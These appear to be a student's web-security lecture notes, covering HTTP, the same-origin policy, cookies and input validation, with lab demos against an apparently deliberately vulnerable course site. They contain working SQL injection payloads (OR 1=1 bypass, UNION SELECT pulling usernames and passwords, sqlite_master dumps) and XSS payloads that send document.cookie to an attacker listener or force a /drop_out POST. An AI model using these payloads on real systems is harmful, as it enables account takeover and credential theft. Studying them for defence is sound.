https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Overview
https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Messages
https://en.wikipedia.org/wiki/Relational_database
https://en.wikipedia.org/wiki/SQL_syntax


**Stateless means HTTP has no memory between requests.**

Each HTTP request is treated as completely fresh and independent. The server doesn't remember anything about you from the previous request. So if you load page 1 and then page 2 on Wikipedia, the server handles request 2 with zero knowledge that request 1 ever happened.

A concrete example: imagine you log into Amazon. You click on a product. Then you add it to cart. Without cookies, the server would have no idea who you are on each of those clicks, every request looks like a stranger walking in.

**That's the "stateless but not sessionless" point**, HTTP itself forgets everything, but cookies patch over that by carrying state (like "this is user Tan, she's logged in") along with every request, so the server can _pretend_ it remembers you.


## Class notes 

### Web Security

We will focus on application, presentation and session part of OSI model. 

Application (Layer 7) eg. amazon.com 

### Assumptions
Site is trustworthy 
Third-party sites are trustworthy. 
DNS is trustworthy.
TLS and CAs are trustworthy.  It is possible TLS is broken but rare thing to see. 
Lower layers of the stack are trustworthy. 
Attackers cannot intercept traffic - TLS partially solves this. 
But there are a lot of technology like proxy end the TLS. so if proxy gets compromised it is a problem. 
**Sites cannot escape the browser sandbox.** 
#### Important: What is origin

Different origins are isolated. -> origin = **<scheme, host, port>** 

**Scheme** = the protocol part of the URL. Examples: `https`, `http`, `ftp`. It's everything before the `://`.

The scheme is specifically the **protocol identifier** at the very start of a URL. Only things like `http`, `https`, `ftp`, `mailto`, `file` etc. are schemes.

GET, POST, PUT are part of the **HTTP request itself** — they tell the server _what action_ you want to perform on a resource:

- **GET** → fetch/read something
- **POST** → submit data to be processed
- **PUT** → store/replace data at a location
- **DELETE** → delete something

A simple way to think about the difference:

- The **scheme** is in the URL → `https://bank.com`
- The **method** is in the request line → `GET /login HTTP/1.1`

They operate at completely different levels. **The scheme is about _how to connect_ (what protocol), the method is about _what to do_ once connected.**

**Host** = the domain name or IP address. Examples: `bank.com`, `www.google.com`, `192.168.1.1`.

**Port** = the network port number. Examples: `443` (default for HTTPS), `80` (default for HTTP), `8080`.

So for a URL like `https://bank.com:443/login`:

- Scheme → `https`
- Host → `bank.com`
- Port → `443`
- 
Every web object is associated with an origin. 
- **HTML, CSS, scripts, images, fonts...** 
eg. the jpeg file that you fetch. 

####  Same Origin Policy: 
**Scripts** from one origin cannot access data from another origin. 
Majorly it is **Javascript, javascript running your browser cannot access other javascripts.** 
Browser is enforcing this policy. **If the browser has a bug it has lost the game.** 

![[Pasted image 20260530134009.png]]

A script running on `bank.com` is trying to secretly send your password to `evil.com`:

1. Creates an HTTP request (`XMLHttpRequest`)
2. Packages up your password into form data
3. POSTs it to `evil.com`

**Why SOP blocks it:**

The **Same-Origin Policy** says: a script can only send/read data to/from the **same origin** it came from. Origin = **protocol + domain + port.**

The script is from `bank.com` but is trying to talk to `evil.com` — that's a **different origin**, so the browser just refuses to send it.
![[Pasted image 20260530134026.png]]

Is allowed because you're just **_embedding_ a resource**, not _reading data back from it_. SOP only kicks in when a script tries to **read or send sensitive data** across origins.

As long as it is the html tag it is allowed. 
< img src="https://evil.com/pic.png">       ✅
< script src="https://evil.com/code.js">    ✅
< link href="https://evil.com/style.css">   ✅

**<script src - "> </script> - a third party code sourcing is allowed though it can be leverage malicious. This is a gap we will be addressing in two weeks.** 
If you apply CSP you do it better - two weeks. 

Blocked (JavaScript trying to read/send data):
xhr.open("POST", "https://evil.com", true)  ❌
fetch("https://evil.com/steal")             ❌

eg. if you are accessing Bank of America you cant access Minecraft javascript. 
- Basics of classic web security

Adjustments possible , login to github using your google account. 

#### Hypertext transfer Protocol (HTTP)

![[Pasted image 20260530135042.png]]

**Stateless** means each HTTP request is completely independent — the server has no memory of previous requests. Every request starts fresh.
HTTP H2,H3 are binary and compressed in multiple ways which dont make any sense. 
Body does not have structures. 

Status code 
**200 family is success** 
**300 is redirection** 
**400 is client error.** 
**500 is not you it is  the server.** 
400 and 500 is useful for class

HTTP is transactional you send one request and send response, batching does not work. 

HTTP is not  stateful like  TCP, but application is stateful like when you login amazon.com 
State is not http job but the backend's job. 

How HTTP "fakes" state:
- **Cookies** — server sends a cookie, browser sends it back on every request. Cookie is one key value pair. 
- **Sessions** — server stores session data, gives you a session ID (usually via a cookie)
- **URL parameters** — state passed in the URL like `?user=tan`
- **LocalStorage/SessionStorage** — browser-side storage JS can read

#### HTTP Request 
![[Pasted image 20260530135819.png]]


resource field is basically the **path + anything attached to it**:

**Just a path:**

```
GET /login
GET /users/profile
GET /images/logo.png
```
`/` means the **root** of the website — basically "give me the homepage."

#### HTTP Response 

![[Pasted image 20260530140336.png]]

**Anti-framing (x-frame-options: SAMEORIGIN)** Prevents your page from being embedded in an `<iframe>` on another site. This blocks **clickjacking** attacks where an attacker puts your bank page in an invisible iframe and tricks you into clicking buttons on it. SAMEORIGIN means only the same site can frame it.

**Disable content sniffing (x-content-type-options: nosniff)** Browsers sometimes try to guess what a file is even if the server says otherwise. `nosniff` says "trust my Content-Type, don't guess." Without this, an attacker could upload a file that looks like an image but the browser sniffs it as JavaScript and runs it.

**Enable anti-XSS filter (x-xss-protection: 1; mode=block)** An older browser-built-in XSS filter. If the browser detects a reflected XSS attempt, it blocks the page from rendering. Mostly deprecated now in modern browsers since CSP does this better, but still seen in older responses.

#### HTTP Methods 

![[Pasted image 20260530140005.png]]
####  Access Control 
![[Pasted image 20260530141954.png]]

##### HTTP Authentication 

Browser → "give me /secret"
Server  → "401, prove who you are"
Browser → "here's base64(tan:mypassword)"
Server  → "ok, here's /secret"

It **must be done over TLS:** Without TLS (HTTPS), anyone on the network can intercept the request and just base64-decode your credentials.

#### Cookies 
 ![[Pasted image 20260530142416.png]]
 
If you set **httponly = true that means cookie cannot be sent through document.cookie() or javascript** 
**some times javascript might need the cookie.** but if not do set this value. 

You login to amazon.com it returns back success page. 

Read set-cookie and cookie. 

![[Pasted image 20260530143720.png]]


For this course we assume TLS is always there. 
TLS does nothing is you go to a malicious site. 
If the website has vulnerability TLS does nothing. 

Basis of web attack is seperation of data and control. 

![[Pasted image 20260530144338.png]]

There are **two** `goto fail` statements. The second one has no `if` condition — it **always executes**, jumping straight to `fail:` no matter what.

**Why this is catastrophic:** The `sslRawVerify()` call below — which actually checks if the signature is valid — **never runs**. The code jumps past it every time.

So the function returns whatever `err` was from the last successful operation (which is `0` = success), meaning it tells the program **"signature verified!"** even when it never checked it.
#### Javascript

eval() 

#### Root of most evil 

Untrusted input. 
everything in a HTTP, request is considered input. 
- **path** 
- **Query string** 
- **Header names, header values**
- **POST parameters** 
- **Hidden form fields** 
- **Cookies** 
- **Uploaded files** 

Everything that comes to the application from external- not just request paylod. but every part of the request. 

### Rule 1: Validate Input 

Validate all input always. 
eg. data type, range.charachters/patters, allowed, whether duplicates or empty values are allowed. 
Against a positive specification. eg does it contain bad characters - you can;t know that you know the good charactehers. 
eg. regular expression match if is it the date. 
e.g get_ip get the network interface and check if is right instead they 
Do it on the server. 
- client-side checks are trivial to bypass. 
Do it as early as possible.
if the validation fails, drop the input, don't process it. 

### Rule 2: Sanitize the output 

Output data depends on the output  medium, if there anything in my output that has special meaning , e.g {} in html siginifies text you should not directly copy paste. 
{} - in SQL means something else 

It could becorrectly stripping, encoding them, escape them - but this also depeneds on the output medium. This requires domain knowledge. 
You generally do these through library. 
 <script;> </..> - this could be a firewall bypass 
Input cannot be sanitized, validate input and sanitize output. 
	Never say input sanitization. 
### How do i know what is the input and what is the output. 
Web server receives input and sends to database
- if you are the developer of website it is their input 
  if it is database input it is their output. 

## SQL Injection 
![[Pasted image 20260617131426.png]]


![[Pasted image 20260617131523.png]]

![[Pasted image 20260617131548.png]]

metadata table 

Application level issue like FLask can 

Cross site scripting:  Javascript injection you inject JS code so that the browser will think it has come from the application. 

end goal is your injected script should be in the code. reflect back to you! 

look for some input injection need not be vulnerability always. 


## Demo 1 


![[Pasted image 20260602112140.png]]
![[Pasted image 20260602112215.png]]


Why `asdf` as username
`asdf` is intentionally a username that **doesn't exist**. The point is to prove the SQL injection works regardless of whether the username is valid. If he used `admin` it might look like he just knew the password. Using `asdf` proves he's bypassing auth entirely, not guessing credentials.

Any random string works — `banana`, `xyz`, anything fake.

**Why `asdf' OR 1=1--` as the password?**

--  used for commenting it out. 


The backend SQL query probably looks like:

sql

```sql
SELECT * FROM users 
WHERE username='asdf' AND password='asdf' OR 1=1--'
```
- You typed: `asdf' OR 1=1--`
- The app wraps it in quotes making it: `'asdf' OR 1=1--'`

So the password part becomes:

- `asdf` — matched against password column (fails)
- `'` — **closes** the password string early
- `OR 1=1` — now interpreted as **SQL code**, not a string
- `--` — comments out the trailing `'` the app added

We will login in take note of all the **inputs the application takes** 
![[Pasted image 20260602113644.png]]

Professor is exploring the search functionality.

![[Pasted image 20260602113808.png]]

![[Pasted image 20260602114005.png]]

Then the professor notes that the course number it is clickable and clicks on it. 

Exploring other options and tabs 

![[Pasted image 20260602114324.png]]

The goal is to make Toby drop out. 

Threat modelling is what could possibly go wrong. One way to do is to take toby;s password and login to his account and make him lose it.  

### Make the list of inputs available to you and provoke those inputs and see which one could potentionally be vulnerable to SQL injection. 


Web developers tool 

![[Pasted image 20260602115013.png]]

You can change the headers, the cookie you can play with this too. 


### You put in a sql command like this ' and see if it throws an error. 
![[Pasted image 20260602134249.png]]

**Type `AND 1=1` (always true):**

- 200 with results → SQL injection is working ✓ (true condition shows everything)

**Type `AND 1=2` (always false):**

- 200 with **empty** results → SQL injection is working ✓ (false condition hides everything)

**The key is the DIFFERENCE between the two:**

```
AND 1=1 → results show    ✓
AND 1=2 → results disappear ✓
```

If they behave differently like this → **injection is working**.

If both show the same results regardless → injection is not working, output is being sanitized. 

**500** means your SQL syntax broke something server-side,useful because it confirms the input is reaching SQL, but you **need to fix your syntax.**

![[Pasted image 20260602152745.png]]


**Why UNION?** UNION lets you **attach a completely different SELECT statement** and have its results appear alongside (or instead of) the original results. Unlike `OR 1=1` which just bypasses a condition, UNION actually **extracts data from other tables**.

**Why `SELECT 1`?** Just a test — you're checking if UNION works at all. The `1` is a placeholder. You need to match the number of columns the original query returns (3 in this case — course_code, course_name, grade).

**So the next step would be:**

```
asd' UNION SELECT 1,2,3 --
```
Then replace those numbers with actual data you want:

```
asd' UNION SELECT username, password, 3 FROM users --
```
## **constant** literal

A constant in SQL is any value that doesn't come from a table — it's just a fixed literal. `1` and `3` are **constants/literals** — fixed values you're hardcoding just to satisfy the column count and type requirement:

- `1` — integer constant
- `'hello'` — string constant
- `NULL` — null constant

They don't change row to row, they just **fill a position**.

### How to figure out the constant

When doing UNION injection:

1. Figure out column count
2. Figure out which positions accept text vs integer using constants (`1`, `2`, `'a'`)
3. Replace the constant in a **text-accepting position** with the real column you want to exfiltrate
4. Keep constants everywhere else just to hold the structure together

![[Pasted image 20260605170351.png]]

Professor did his iterations till 6 column till he got the output 

This shows that field 1,2,4 are numbers 

![[Pasted image 20260605170554.png]]

Professor is trying iterations here putting sql at position 5. 

![[Pasted image 20260605171424.png]]

This is giving an internal error. 

![[Pasted image 20260605171453.png]]

Professor changed the iteration to number 6. 

![[Pasted image 20260605171741.png]]
![[Pasted image 20260605171756.png]]

We already established that 1,2,4 are numbers so we trying something at 3.

![[Pasted image 20260605172052.png]]
![[Pasted image 20260605172109.png]]


###  What is `sqlite_master`

Every SQLite database has a built-in table called `sqlite_master` that stores the **schema** — basically a map of the entire database:

- All table names
- All column names
- How everything is structured

It's like a directory of the database itself.

**What `sqlite_master` contains:**

sql

```sql
type    -- 'table', 'index', 'view'
name    -- name of the table/index
tbl_name -- table it belongs to
rootpage
sql     -- the CREATE TABLE statement!
```
**So your injection:**

```
asd' UNION SELECT 1,2,3,4,5,6 FROM sqlite_master --
```

Is trying to dump the schema.

![[Pasted image 20260602170807.png]]


Be aware of the tiny implementation details. 

'  and paranthesis is what you should look into it. 
## Javascript injection / Cross site scripting 
![[Pasted image 20260617131828.png]]

Because of the Same orgin policy document.cookie being javascript code. You can only work on the same origin. It cannot come from localhost it should come from northeastern.edu something like that. We will try code injection for that. find a way to check your javascript into the program. 

### Reflected XSS

![[Pasted image 20260617132514.png]]

### Stored XSS
![[Pasted image 20260617132724.png]]

![[Pasted image 20260617132822.png]]

### Step 1: Find a code injection vector 

Check when you provide some input to the application and get response. when you look at the source your injected code should be reflected in the source. Input that is reflected back if that doesnt exists you can;t inject anything. 

![[Pasted image 20260605173658.png]]


Now this is one of the hint 

![[Pasted image 20260605175136.png]]
![[Pasted image 20260605175238.png]]

If there is no input validation and output sanitization. these would get replaced with html entities. 
![[Pasted image 20260605175359.png]]

In the source code of you see there is a value. 

![[Pasted image 20260605175618.png]]

This is one of script that we run across 


![[Pasted image 20260606170158.png]]

```
<script> alert(document.cookie)</script>
```

if this does not work use things like 
'```
 <img src=
```

```
### Step 2: Make it a stored XSS 

Now we will try to do stored xss for it, this field is not very promosing. 

![[Pasted image 20260606180103.png]]

We have this profile update page. 

![[Pasted image 20260606180211.png]]

Add a script at Display name

![[Pasted image 20260606180255.png]]
![[Pasted image 20260606185131.png]]


![[Pasted image 20260606185323.png]]

### Step 3: Make sure you record the released cookie. 

![[Pasted image 20260606185732.png]]
![[Pasted image 20260606185854.png]]

The `listen.sh` script just runs a simple Python HTTP server on `127.0.0.1:6001`. It's acting as the **attacker's server**.


```
Victim's browser
      ↓  (XSS payload fires)
Sends GET request to attacker's server
      ↓
GET /x.jpg?login=toby|707c6cdedbf52e52a340d6901136c14
```

The XSS payload injected into the vulnerable site probably looked something like:

javascript

```javascript
<img src="http://127.0.0.1:6001/x.jpg?login=" + document.cookie>
```

So when the victim visits the page, their browser **automatically makes a request** to the attacker's server, with the **stolen cookie/session token appended as a query parameter**.


Image tages are not subjected to same origin policy. 

Another way of doing it is copy the script, obfuscate it and send it to someone via mail and mislead them to click it like social engineering way.  


![[Pasted image 20260606190925.png]]
##

To defend against your first attack, the developers change this 

![[Pasted image 20260606191333.png]]

https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies

`HttpOnly` flag on a cookie means the **browser hides the cookie from client-side JavaScript** (i.e., you cannot access it via `document.cookie` or `XHR/fetch` response headers) cannot be accessed via javascript. 

You want to perform this function 

![[Pasted image 20260606192204.png]]
The goal is to drop Toby;s account, So that he programatically goes and click on do it. 
The caveat to remember is he is authorized tool. 

![[Pasted image 20260606192811.png]]

When injected as a stored XSS payload, any user who visits that page will **automatically make a POST request to `/drop_out`** — with their own cookies attached without knowing it.

The browser automatically sends cookies with every request. So if a victim visits the page:

1. Their browser executes the JS
2. XHR fires a POST to `/drop_out`
3. The request carries **their session cookies**
4. Server thinks the victim intentionally hit that endpoint

![[Pasted image 20260606203014.png]]

![[Pasted image 20260606203050.png]]

![[Pasted image 20260607010757.png]]
## Code injection 

![[Pasted image 20260617131652.png]]
## Cross-Site Request Forgery

![[Pasted image 20260617134652.png]]
### What is Document Object Model

When your browser loads a webpage, it converts all the HTML into a **tree structure** that JavaScript can interact with. That tree is the DOM.

```

<body>
  <div id="name">Kaan</div>
  <p>Welcome!</p>
</body>

```
Becomes a tree the browser builds internally, and JavaScript can access/modify it via `document.something`:

document.getElementById("name")  // grabs that div
document.cookie                   // grabs cookies
document.title                    // grabs page title


whaterver we mention through div id = 'something; e.g. div id="roll_number" this can be accessesed by  document.getElementById("roll_number")

So when the slide says **"not exposed to the DOM"** it means JavaScript **cannot access it** through `document.cookie` or any other DOM API.

### **Why the name HttpOnly?**

The name means **"this cookie should only travel over HTTP"** — meaning:

- ✅ Browser can send it in HTTP requests automatically
- ❌ JavaScript/DOM cannot touch it at all

So the cookie still does its job (authenticating you with the server) but JS is completely locked out from reading it.


![[Pasted image 20260617135734.png]]

### CSRF Tokens

![[Pasted image 20260617135857.png]]
![[Pasted image 20260617135915.png]]